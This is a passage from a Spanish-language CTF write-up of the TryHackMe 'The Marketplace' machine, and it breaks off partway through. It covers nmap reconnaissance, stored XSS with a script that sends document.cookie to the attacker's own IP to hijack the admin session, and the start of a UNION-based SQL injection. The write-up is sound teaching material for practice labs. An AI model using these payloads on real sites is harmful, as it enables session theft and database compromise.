<!DOCTYPE html><html lang="es" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="dias antes"><meta name="hour-prompt" content="horas antes"><meta name="minute-prompt" content="minutos antes"><meta name="justnow-prompt" content="justo ahora"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="The Marketplace - THM Writeup" /><meta property="og:locale" content="es" /><meta name="description" content="Un sitio donde depositar la informacion adquirida en el mundo del pentesting para ayudar a la comunidad y tener referencias en espanol sobre hacking etico." /><meta property="og:description" content="Un sitio donde depositar la informacion adquirida en el mundo del pentesting para ayudar a la comunidad y tener referencias en espanol sobre hacking etico." /><link rel="canonical" href="https://rjceledon.github.io/posts/the-marketplace-thm-writeup/" /><meta property="og:url" content="https://rjceledon.github.io/posts/the-marketplace-thm-writeup/" /><meta property="og:site_name" content="Rich J. Celedon" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-01-07T22:55:30+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="The Marketplace - THM Writeup" /><meta name="twitter:site" content="@" /> <script type="application/ld+json"> {"description":"Un sitio donde depositar la informacion adquirida en el mundo del pentesting para ayudar a la comunidad y tener referencias en espanol sobre hacking etico.","url":"https://rjceledon.github.io/posts/the-marketplace-thm-writeup/","@type":"BlogPosting","headline":"The Marketplace - THM Writeup","dateModified":"2022-01-17T23:09:43+00:00","datePublished":"2022-01-07T22:55:30+00:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://rjceledon.github.io/posts/the-marketplace-thm-writeup/"},"@context":"https://schema.org"}</script><title>The Marketplace - THM Writeup | Rich J. Celedon</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Rich J. Celedon"><meta name="application-name" content="Rich J. Celedon"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end" lang="es"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/bio-photo.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Rich J. Celedon</a></div><div class="site-subtitle font-italic">Ciberseguridad y Hacking Etico</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>INICIO</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIAS</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVOS</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ACERCA</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/rjceledon" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['zeytips','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Inicio </a> </span> <span>The Marketplace - THM Writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Buscar..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancelar</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>The Marketplace - THM Writeup</h1><div class="post-meta text-muted"><div> Por <em> <a href="https://twitter.com/">Rich J. Celedon</a> </em></div><div class="d-flex"><div> <span> Publicado <em class="timeago" date="2022-01-07 22:55:30 +0000" data-toggle="tooltip" data-placement="bottom" title="Fri, 7 Jan, 2022, 10:55 PM +0000" > 7 Jan, 2022</em> </span> <span> Actualizado <em class="timeago" date="2022-01-17 19:09:43 -0400 " data-toggle="tooltip" data-placement="bottom" title="Mon, 17 Jan, 2022, 7:09 PM -0400" >17 Jan, 2022</em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="3258 palabras"> <em>18 min</em> leer</span></div></div></div><div class="post-content"><p><img data-src="https://tryhackme-images.s3.amazonaws.com/room-icons/7c385ae7e0ef53362b807fffe8b69a47.png" alt="image" width="100" data-proofer-ignore></p><p>En el campo de la ciberseguridad, el realizar las pruebas en competencias del tipo <code class="language-plaintext highlighter-rouge">Captura la bandera</code> o <code class="language-plaintext highlighter-rouge">CTF</code> nos ayuda a comprender los conceptos claves sobre aquellas vulnerabilidades que pudiesen estar presentes en un entorno empresarial.</p><p><a href="https://www.tryhackme.com">TryHackMe</a> es una de esas plataformas donde presentan maquinas en la nube virtualizadas con las cuales se puede practicar las auditorias de ciberseguridad en entornos controlados.</p><p>El dia de hoy se presenta una guia o <code class="language-plaintext highlighter-rouge">Writeup</code> en el cual se explica la metodologia de trabajo a seguir para lograr obtener las <code class="language-plaintext highlighter-rouge">Flags</code> necesarias para completar este reto.</p><p>Para ello empezaremos logeandonos en <code class="language-plaintext highlighter-rouge">TryHackMe</code> con nuestras credenciales, vamos al apartado de <code class="language-plaintext highlighter-rouge">Learn</code> y desde ahi usamos el buscador para encontrar nuestra maquina llamada <code class="language-plaintext highlighter-rouge">The Marketplace</code> con la siguiente descripcion:</p><p class="alert alert-info">The sysadmin of The Marketplace, <strong><em>Michael</em></strong>, has given you access to an internal server of his, so you can pentest the marketplace platform he and his team has been working on. He said it still has a few bugs he and his team need to iron out. Can you take advantage of this and will you be able to gain root access on his server?</p><p>Aunque no parezca de gran importancia, al tener esta descripcion ya debemos de tomar en cuenta que es posible que exista el usuario <code class="language-plaintext highlighter-rouge">michael</code> en el sistema.</p><p>Una vez logeados, procedemos a iniciar la maquina <del>y agregarle 1 hora mas por si acaso</del>, luego nos conectamos al VPN con</p><blockquote><p><code class="language-plaintext highlighter-rouge">sudo openvpn /PATHTO/USER.ovpn</code></p></blockquote><p>y empezamos…</p><h2 id="reconocimiento">RECONOCIMIENTO <a href="#reconocimiento" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>Para empezar nuestro reconocimiento, ya sabemos que esta maquina es Linux pero podriamos averiguarlo al hacer <code class="language-plaintext highlighter-rouge">ping -c 1 IPMAQUINA</code> y ver si el TTL del paquete esta cercano a 64 (Linux) o a 128 (Windows), luego procederemos a hacer un escaneo completo de todos los puertos TCP utilizando NMap con ciertas opciones que nos ayudaran a identificar mejor los puertos que de verdad se quieren obtener, para ello utilizamos el siguiente comando</p><blockquote><p><code class="language-plaintext highlighter-rouge">nmap -p- --open -T5 -n -v 10.10.134.243 -oN puertos.txt</code></p></blockquote><p>Donde se especifican los 65535 puertos TCP con <code class="language-plaintext highlighter-rouge">-p-</code>, se obtienen solo los puertos con estado <code class="language-plaintext highlighter-rouge">--open</code>, se utiliza la maxima velocidad de escaneo con <code class="language-plaintext highlighter-rouge">-T5</code>, se evita el uso de DNS con <code class="language-plaintext highlighter-rouge">-n</code>, se utiliza el verbose con <code class="language-plaintext highlighter-rouge">-v</code> para ver los puertos que se vayan encontrando, y finalmente se extrae la salida del escaneo a un archivo con <code class="language-plaintext highlighter-rouge">-oN puertos.txt</code></p><p>Con esto nos encontramos con la siguiente salida:</p><p><img data-src="https://user-images.githubusercontent.com/85322110/148669325-87837453-932e-4d1a-b484-6e23cbfc7ef1.png" alt="image" data-proofer-ignore></p><p>Donde se pueden observar que tenemos los puertos TCP abiertos <code class="language-plaintext highlighter-rouge">22,80,32768</code></p><p>Procedemos a seguir enumerando con mas detalle estos puertos que fueron encontrados abiertos, haciendo uso de otras opciones de NMap para usar scripts de enumeracion por defecto con <code class="language-plaintext highlighter-rouge">-sC</code> y detectando la version de los protocolos abiertos con <code class="language-plaintext highlighter-rouge">-sV</code></p><blockquote><p><code class="language-plaintext highlighter-rouge">nmap -sC -sV -p22,80,32768 10.10.134.243 -oN version.txt</code></p></blockquote><p>Nos topamos con la siguiente informacion:</p><p><img data-src="https://user-images.githubusercontent.com/85322110/148669184-c6ce64b2-f793-484a-85f1-282aabcb62e6.png" alt="image" data-proofer-ignore></p><p>Vemos que existen dos paginas http tanto en el puerto 80 como en el 32768, para ellas dos vamos a utilizar el paquete <code class="language-plaintext highlighter-rouge">whatweb</code> para obtener informacion extra de estas:</p><blockquote><p><code class="language-plaintext highlighter-rouge">whatweb http://10.10.134.243 http://10.10.134.243:32768 | tee whatweb.txt</code></p></blockquote><p>Con <code class="language-plaintext highlighter-rouge">tee</code> hacemos que la salida del programa se muestre en consola y al mismo tiempo se cree un archivo con el mismo contenido, tenemos lo siguiente:</p><p><img data-src="https://user-images.githubusercontent.com/85322110/148669493-292bf805-00d3-40e7-abe1-8a673830b1de.png" alt="image" data-proofer-ignore></p><p>A este punto podemos abrir el navegador web y abrir la pagina del puerto 80 primero, y ahi utilizar la extension <a href="https://www.wappalyzer.com/apps/">Wappalyzer</a> que nos dara mas o menos la misma informacion obtenida por <code class="language-plaintext highlighter-rouge">whatweb</code> como sigue:</p><p><img data-src="https://user-images.githubusercontent.com/85322110/148669563-7546a42f-1f93-429a-ad55-a0529e1b4126.png" alt="image" data-proofer-ignore></p><p>Ya con la informacion que tenemos, se puede empezar con la siguiente etapa…</p><h2 id="escaneo">ESCANEO <a href="#escaneo" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>Con la informacion obtenida anteriormente, tenemos tres puertos con los cuales podemos iniciar a probar vectores de ataque.</p><p>Para el puerto <code class="language-plaintext highlighter-rouge">22 SSH</code> no hay mucho que hacer pues no disponemos de credenciales y al probar credenciales por defecto no logramos acceso, pasamos a probar la pagina web del puerto <code class="language-plaintext highlighter-rouge">80 HTTP</code> a ver que encontramos.</p><p>Al entrar en la pagina nos topamos con un cierto estilo de catalogo de objetos, pero lo interesante es que vemos un panel de <em>Log in</em> y <em>Sign up</em>, es altamente recomendable antes de empezar a probar cualquier cosa, registrarse en la pagina (y esto aplica siempre que exista un apartado de registro) para revisar el funcionamiento y ver que se puede lograr siendo un usuario basico recien registrado.</p><p>Una vez logeados, hemos obtenido una Cookie de sesion llamada <code class="language-plaintext highlighter-rouge">token</code> que no existia antes, y con <a href="https://www.editthiscookie.com/blog/2014/03/install-editthiscookie/">EditThisCookie</a> podemos ver y alterar su valor, con lo cual podemos tener en cuenta de que podriamos explotar un posible <em>Cookie Hijacking</em></p><p><img data-src="https://user-images.githubusercontent.com/85322110/148669908-af5c890f-fd2f-4308-82cd-5c81677f1e41.png" alt="image" data-proofer-ignore></p><p>Por ahora no podemos hacer nada, asi que seguimos, y vemos que se pueden crear nuevos objetos en el catalogo que aparece al inicio donde tenemos un formulario para <code class="language-plaintext highlighter-rouge">Titulo</code>, <code class="language-plaintext highlighter-rouge">Descripcion</code> y un sospechoso apartado para subir archivos que esta desactivado segun por razones de seguridad:</p><p><img data-src="https://user-images.githubusercontent.com/85322110/148669762-adcdb5d1-ad87-499f-a0ca-049247bd6838.png" alt="image" data-proofer-ignore></p><p>Podriamos intentar saltarnos la desactivacion del boton usando el mismo codigo fuente de la pagina</p><p><img data-src="https://user-images.githubusercontent.com/85322110/148669793-942b2c7f-d0ab-4687-85a8-e3d1a31ee7bc.png" alt="image" data-proofer-ignore></p><p>Pero luego de diferentes pruebas, el boton parece no tener efecto a pesar de tener cargado un archivo, asi que suponemos el deshabilitado de subidas fue hecho tambien en el codigo lo cual dificultaria la evacion de esta restriccion.</p><p>Siguiendo adelante, crear el nuevo objeto, la misma pagina nos redirecciona a este:</p><p><img data-src="https://user-images.githubusercontent.com/85322110/148669869-5e18687e-67b9-4a7f-9ce4-d45931c10ae7.png" alt="image" data-proofer-ignore></p><p>Aca vemos que existen opciones adicionales para contactar al creador del objeto, y ademas una opcion que nos permite Reportar el objeto al equipo de administradores de la pagina, una vez reportado el objeto recibimos un mensaje de que un administrador revisara si existe una regla y nos devolvera un mensaje con el resultado.</p><p><img data-src="https://user-images.githubusercontent.com/85322110/148669986-561e2b2f-d1d5-464e-82c3-5f7b6326b6b0.png" alt="image" data-proofer-ignore></p><p>Pasado un corto tiempo, al revisar los mensajes nuevamente, vemos que un administrador efectivamente abrio el objeto listado y nos devolvio un mensaje diciendo que no hay nada que viole los reglamentos</p><p><img data-src="https://user-images.githubusercontent.com/85322110/148670008-741b677f-e228-42b2-98f9-689858eabca8.png" alt="image" data-proofer-ignore></p><p>Si el administrador abre efectivamente la publicacion del objeto, esto nos indica un posible vector de ataque de <code class="language-plaintext highlighter-rouge">Cross-Site Request Forgery (XSRF)</code> donde se aprovecha de que un usuario privilegiado acceda a un recurso “malicioso” otorgado por un usuario no-privilegiado con fines cuestionables.</p><p>Para ello probaremos si algunos de los formularios para crear un nuevo objeto son vulnerables a <code class="language-plaintext highlighter-rouge">Cross Site Scripting (XSS)</code> y podemos ejecutar codigo HTML o JS en el mismo. Esto lo podemos hacer de muchisimas formas pero aca va una lista de las mas comunes a probar:</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nt">&lt;h1&gt;</span>Encabezado<span class="nt">&lt;/h1&gt;</span>
<span class="nt">&lt;marquee&gt;</span>Texto moviendose<span class="nt">&lt;/marquee&gt;</span>
<span class="nt">&lt;script&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="dl">'</span><span class="s1">Alerta emergente</span><span class="dl">'</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p><img data-src="https://user-images.githubusercontent.com/85322110/148670203-c628d353-80c1-46c5-8fe5-954a8b483516.png" alt="image" data-proofer-ignore></p><p>Al probar el etiquetado <code class="language-plaintext highlighter-rouge">&lt;script&gt;</code> vemos que efectivamente el sitio es vulnerable a <code class="language-plaintext highlighter-rouge">XSS</code> y los scripts si pueden ser ejecutados y forjados:</p><p><img data-src="https://user-images.githubusercontent.com/85322110/148670222-6780c408-303f-4373-a386-fd4c50dd1932.png" alt="image" data-proofer-ignore></p><p>Ya que sabemos que podemos introducir scripts dentro de los objetos que creamos, y sabemos que podemos hacer reporte a los admins para que ellos abran forzadamente estos objetos, podemos pensar en maneras de robarles la <strong>cookie de sesion</strong> y asi tener un acceso privilegiado a traves del robo de ese <code class="language-plaintext highlighter-rouge">token</code>.</p><p>Para esto podriamos hacer uso del objeto <code class="language-plaintext highlighter-rouge">document</code> presente en <a href="https://www.w3schools.com/js/js_htmldom_document.asp">JavaScript</a> y aprovecharnos de la propiedad <code class="language-plaintext highlighter-rouge">.cookie</code> de este mismo para poder leer las Cookies de la persona que ejecuta el script.</p><p>Si en vez de pasar texto a la funcion <code class="language-plaintext highlighter-rouge">alert()</code> pasamos la propiedad <code class="language-plaintext highlighter-rouge">document.cookie</code> del modo</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nt">&lt;script&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p>Y lo introducimos dentro del campo Descripcion del objeto, al abrir este objeto nos topamos con una alerta emergente con nuestra Cookie de sesion actual:</p><p><img data-src="https://user-images.githubusercontent.com/85322110/148670387-35d03214-b6a3-4901-9fa8-e1ce49e45533.png" alt="image" data-proofer-ignore></p><p>Ahora bien, nuestro interes es de cierta forma remotamente obtener la Cookie del administrador, pero mostrarlo en una alerta emergente para el no nos servira de mucho, asi que debemos pensar una forma de obtener esa informacion en nuestro extremo y lograr nuestro <code class="language-plaintext highlighter-rouge">Cookie Hijacking</code> a ver que privilegios logramos.</p><p>Una de estas formas es hacer un script que intente hacer una peticion <code class="language-plaintext highlighter-rouge">GET</code> a un servidor web nuestro y agregar de alguna forma la Cookie actual en algun campo de esta peticion <code class="language-plaintext highlighter-rouge">GET</code>. Esto se logra facilmente si nos montamos un servidor web local con <code class="language-plaintext highlighter-rouge">Python</code> a traves de un modulo que trae por defecto llamado <code class="language-plaintext highlighter-rouge">http.server</code>, lo montamos de la siguiente forma:</p><blockquote><p>sudo python -m http.server 80</p></blockquote><p><img data-src="https://user-images.githubusercontent.com/85322110/148670510-17926c3c-f02a-471d-867f-b2f7a3e88e4a.png" alt="image" data-proofer-ignore></p><p>Ya con esto tenemos un servidor activo en el puerto 80 de nuestra IP, el cual nos mostrara las peticiones en pantalla. De esta forma si creamos un nuevo objeto en el Marketplace y utilizamos el siguiente tag en el campo de Descripcion</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"http://10.8.33.130/image.jpg"</span><span class="nt">&gt;&lt;/img&gt;</span>
</pre></table></code></div></div><p>Vemos que esta tag intentara poner una imagen proveniente de nuestra IP 10.8.33.130 (asignada en la interfaz <code class="language-plaintext highlighter-rouge">tun0</code> proporcionada por el <code class="language-plaintext highlighter-rouge">openvpn</code>) pero dicha imagen no existe, sin embargo en la consola logramos ver la peticion de igual manera:</p><p><img data-src="https://user-images.githubusercontent.com/85322110/148670569-f40a419e-a2a2-4fc4-ae8b-c384e75accb5.png" alt="image" data-proofer-ignore></p><p>Ahora hay que buscar una forma de agregar la Cookie a esta peticion, para ello podriamos hacer uso de otra propiedad del objeto <code class="language-plaintext highlighter-rouge">document</code> llamada <code class="language-plaintext highlighter-rouge">.write</code> la cual escribe dentro de la salida del HTML en si, y con el siguiente script podemos precisamente agregar la cookie al final de la peticion que hicimos en la imagen:</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nt">&lt;script&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="dl">'</span><span class="s1">&lt;img src="http://10.8.33.130/image.jpg?</span><span class="dl">'</span> <span class="o">+</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">"&gt;&lt;/img&gt;</span><span class="dl">'</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p>Analizando el script, vemos que es la misma peticion <code class="language-plaintext highlighter-rouge">&lt;img src="http://10.8.33.130/image.jpg"&gt;&lt;/img&gt;</code> pero se le agrego <code class="language-plaintext highlighter-rouge">?token=xxxxxxxxxxxxxx</code> a traves de concatenacion lograda por el metodo <code class="language-plaintext highlighter-rouge">document.write</code> presente en JavaScript.</p><p>Si creamos nuevamente un objeto dentro del Marketplace con el script fabricado arriba, veremos la respuesta en consola al hacer la peticion por la <code class="language-plaintext highlighter-rouge">img</code></p><p><img data-src="https://user-images.githubusercontent.com/85322110/148670692-816dad45-3ac7-43a0-8476-f4b1ae841cf0.png" alt="image" data-proofer-ignore></p><p>A pesar de seguir respondiendo con un codigo 404 imagen no existente, igual podemos ver la Cookie de sesion (en este caso de nuestra propia cuenta que creamos). Ahora bien, este objeto creado en Marketplace enviara la peticion junto con la Cookie a nuestro servidor de cualquier persona que abra este item, y sabemos que los admins abren estos objetos al ser reportados, sabiendo esto pasaremos a reportar este mismo objeto a ver si un admin lo abre y podemos robar su <em>Cookie de sesion</em>.</p><p><img data-src="https://user-images.githubusercontent.com/85322110/148670735-6a419888-d796-43ca-bbc7-1e1a16b7255f.png" alt="image" data-proofer-ignore> <img data-src="https://user-images.githubusercontent.com/85322110/148670742-d8cfec36-3254-4c41-b068-c68259a39847.png" alt="image" data-proofer-ignore></p><p>El servidor web fue re-lanzado para tener una consola limpia, y vemos que efectivamente hemos recibido una <code class="language-plaintext highlighter-rouge">Cookie de sesion</code> al enviar el reporte (esperando que sea la de admin), si luego con nuestro <a href="https://www.editthiscookie.com/blog/2014/03/install-editthiscookie/">EditThisCookie</a> cambiamos nuestra Cookie actual a esta que hemos recibido:</p><p><img data-src="https://user-images.githubusercontent.com/85322110/148670778-8fe91f1c-d2ef-467e-abda-a9f0a1572ba4.png" alt="image" data-proofer-ignore></p><p>Al presionar F5 o recargar la pagina, notamos que aparece un nuevo boton llamado <code class="language-plaintext highlighter-rouge">Administration panel</code> presente en las opciones de la pagina, cosa que no salia anteriormente.</p><p><img data-src="https://user-images.githubusercontent.com/85322110/148670794-492484f0-4593-475a-992d-69670a537f5b.png" alt="image" data-proofer-ignore></p><p>Y al entrar nos encontramos con nuesta primera flag y una lista de usuarios registrados en el sitio:</p><p><img data-src="https://user-images.githubusercontent.com/85322110/148670834-6aac0989-9b5a-46b4-abd8-ee8063a07627.png" alt="image" data-proofer-ignore></p><p>Comprobamos que efectivamente existe un usuario para <code class="language-plaintext highlighter-rouge">michael</code>. Al hacer click en cualquiera de estos usuarios nos lleva a otra pagina donde nos muestra ciertos atributos de ese usuario, sin embargo de la forma en que la muestra, pareciera estar obteniendo valores de una Base de Datos por como obtenemos los mismos atributos al solo cambiar el ID del usuario en la URL:</p><p><img data-src="https://user-images.githubusercontent.com/85322110/148671010-ed013413-319d-4422-8980-e75dbe159eb6.png" alt="image" data-proofer-ignore></p><p>Con ello, probando insertar una sola comilla en el campo <code class="language-plaintext highlighter-rouge">?user=1</code> de la URL, vemos que efectivamente estamos ante un MySQL y la entrada del usuario no esta sanitizada para prevenir <code class="language-plaintext highlighter-rouge">SQL Injection</code></p><p><img data-src="https://user-images.githubusercontent.com/85322110/148671046-af82c749-ec12-48c7-b79b-88fa1552f7b5.png" alt="image" data-proofer-ignore></p><p>Por lo tanto, procedemos a hacer pasos para enumerar las bases de datos existentes a traves de <code class="language-plaintext highlighter-rouge">SQL Injection</code>:</p><ul><li>Encontrar cantidad de columnas mostradas:</ul><p>Lo primero que debemos hacer es encontrar la cantidad de columnas que se muestran en la pagina, mas adelante se explica el por que debemos hacer este paso. Existen varias formas de lograr esto, pero la mas comun es usando la instruccion <code class="language-plaintext highlighter-rouge">ORDER BY #</code> (añadiendo <code class="language-plaintext highlighter-rouge">;-- -</code> para finalizar la instruccion con <code class="language-plaintext highlighter-rouge">;</code> y comentar el resto de la linea <code class="language-plaintext highlighter-rouge">-- -</code> que existiese dentro del codigo fuente) de MySQL, a esta instruccion le presigue un numero que debemos probar hasta que nos arroje error, al momento de arrojar error significa que el numero usado es efectivamente mayor que la cantidad de columnas existentes en la tabla actual, por lo cual nos quedamos con el numero anterior, ejemplo:</p><blockquote><p><code class="language-plaintext highlighter-rouge">http://10.10.134.243/admin?user=1 ORDER BY 5;-- -</code></p></blockquote><p>Al usar el numero 5 nos arroja un error con el cual podemos presumir que el numero real de columnas es 4 y no 5, ya que ni con 4 ni 3 ni 2 ni 1 da error.</p><p><img data-src="https://user-images.githubusercontent.com/85322110/148671336-57569e22-b7b5-47ce-afff-3e6bf30f4aa5.png" alt="image" data-proofer-ignore></p><p>Otra opcion sera la de usar directamente los numeros separados por comas para asi tener una respuesta mas rapida, a cuesta del tiempo que tardamos en introducir la cantidad de numeros a probar como:</p><blockquote><p><code class="language-plaintext highlighter-rouge">http://10.10.134.243/admin?user=1 ORDER BY 1,2,3,4,5,6,7,8,9,10;-- -</code></p></blockquote><p>Con esto recibiremos exactamente el mismo error anterior, indicando falla en encontrar la columna 5, es decir que existen solo 4 de ellas.</p><ul><li>Implantar campos de prueba en tablas mostradas:</ul><p>Lo que viene es hacer uso de la instruccion <code class="language-plaintext highlighter-rouge">UNION</code> para unir la tabla existente y una falsa tabla que nos crearemos con el fin de poder ver en al menos un campo, el resultado de las peticiones que haremos mas adelante.</p><p>Para esto debemos añadir <code class="language-plaintext highlighter-rouge">UNION SELECT 1,2,3,4;-- -</code> al final de la peticion, recordando que ahora sabemos que son 4 la cantidad de columnas existentes. Si se intenta esto a pesar de no obtener error, nuestro interes final es que aparezca los numeros introducidos (1, 2, 3 o 4) en algun campo de la pagina, sin embargo esto no pasa y es porque la cantidad de elementos a mostrar esta delimitada, para evitar esto cambiamos el valor que realmente es comparado en la base de datos (<code class="language-plaintext highlighter-rouge">user=1</code>) por algun otro que no exista, puede ser cualquiera mayor a 3 (ya que 3 es el ID de nuestro usuario creado, el usuario con ID 4 no existe, ni ningun otro numero mayor), pero lo mas comun usado en <code class="language-plaintext highlighter-rouge">SQL Injection</code> es cambiarlo 